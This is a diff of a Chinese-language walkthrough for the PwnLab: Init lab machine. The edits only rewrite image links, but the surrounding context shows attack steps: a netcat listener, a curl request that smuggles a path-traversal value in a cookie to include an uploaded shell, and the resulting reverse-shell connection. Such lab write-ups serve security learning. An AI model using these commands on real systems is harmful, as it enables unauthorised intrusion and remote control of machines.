@@ -341,7 +341,7 @@ function printit ($string) {
 
 ------WebKitFormBoundaryKIqUqRihAu8DUg9a
 ```
-![[pwnlab-init-文件上传.png]]
+![pwnlab-init-文件上传](../img/PwnLab-Init/pwnlab-init-文件上传.png)
 打开终端，监听7777端口
 ```bash
 nc -lvp 7777
@@ -351,7 +351,7 @@ nc -lvp 7777
 curl -v --cookie "lang=../upload/7b2b8553fec172b77b3c3bf2fd832f15.gif" http://192.168.1.193:80
 ```
 触发 Cookie LFI（见`index.php`），于是就拿到了提示符`$`
-![[pwnlab-init-反弹Shell.png]]
+![pwnlab-init-反弹Shell](../img/PwnLab-Init/pwnlab-init-反弹Shell.png)
 ```
 listening on [any] 7777 ...
 connect to [192.168.1.3] from (UNKNOWN) [192.168.1.193] 34585
